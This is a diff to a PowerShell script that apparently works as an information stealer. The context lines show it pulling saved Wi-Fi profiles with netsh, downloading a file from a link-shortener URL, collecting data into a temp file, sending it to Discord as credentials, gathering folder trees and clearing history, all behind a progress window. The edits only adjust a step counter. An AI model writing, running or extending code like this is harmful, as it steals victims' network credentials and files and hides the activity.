@@ -115,7 +115,7 @@ $window.Content = $grid
 $window.Show()
 
 # Define the total number of tasks (replace with the number of main operations)
-$totalSteps = 5  # Adjust this to the number of main operations you want to track
+$totalSteps = 10  # Adjust this to the number of main operations you want to track
 
 # Example operations (replace with your actual code)
 for ($step = 1; $step -le $totalSteps; $step++) {
@@ -124,6 +124,7 @@ for ($step = 1; $step -le $totalSteps; $step++) {
         1 {
             # Operation 1 - Extract Wi-Fi profiles
             $textBlock.Text = "Starting Operation 1..."
+            $totalSteps = 1
             try {
                 netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
                     $wlan = $_.Matches.Value
@@ -156,12 +157,14 @@ for ($step = 1; $step -le $totalSteps; $step++) {
                 Add-Type -AssemblyName PresentationFramework
                 [System.Windows.MessageBox]::Show("An error occurred: $($_.Exception.Message)", 'Error')
             }
+            $totalSteps = 2
             $textBlock.Text = "Extracted!"
             $textBlock.Text = "Starting operation 2..."
             # Write-Output "Completed Operation 1 - NETSH"
         }
         2 {
             # Operation 2
+            $totalSteps = 3
             $url = "https://lnkfwd.com/u/Kpj_Yric"  # Define the URL of the file to be downloaded
             $tempPath = [System.IO.Path]::Combine($env:TEMP, "example.txt")  # Define the path to save the file in the %temp% folder
             Invoke-WebRequest -Uri $url -OutFile $tempPath # Use Invoke-WebRequest to download the file
@@ -187,11 +190,12 @@ for ($step = 1; $step -le $totalSteps; $step++) {
 
             $textBlock.Text = "Done operation 2!"
             $textBlock.Text = "Starting operation 3..."
-
+            $totalSteps = 4
             # Write-Output "Completed Operation 2"
         }
         3 {
             # Operation 3 - EXTRACT DATA 
+            $totalSteps = 5
 
             $outputFilePath = "$env:TEMP\data.txt"
             Start-Sleep -Seconds 2 # Wait a moment for the application to fully load
@@ -214,9 +218,11 @@ for ($step = 1; $step -le $totalSteps; $step++) {
             $textBlock.Text = "Done operation 3"
             $textBlock.Text = "Starting operation 4..."
             # Write-Output "Completed Operation 3 - EXTRACT DATA"
+            $totalSteps = 6
         }
         4 {
             # Operation 4 - SEND TO DISCORD
+            $totalSteps = 7
 
             $filePath = "$env:TEMP\data.txt" # Define the path to the text file using the TEMP environment variable
 
@@ -264,8 +270,10 @@ for ($step = 1; $step -le $totalSteps; $step++) {
             $textBlock.Text = "Done operation 4..."
             $textBlock.Text = "Starting last operation ..."
             # Write-Output "Completed Operation 4 - CRED done"
+            $totalSteps = 8
         }
         5 {
+            $totalSteps = 9
             #Operation 5 - TREE Files Extract
             # Define the folders to search
             $folders = @(
@@ -382,6 +390,7 @@ for ($step = 1; $step -le $totalSteps; $step++) {
             Clear-History
 
             $textBlock.Text = "Done Last operation."
+            $totalSteps = 10
     
             # Display a message box indicating completion
             # Add-Type -AssemblyName PresentationFramework
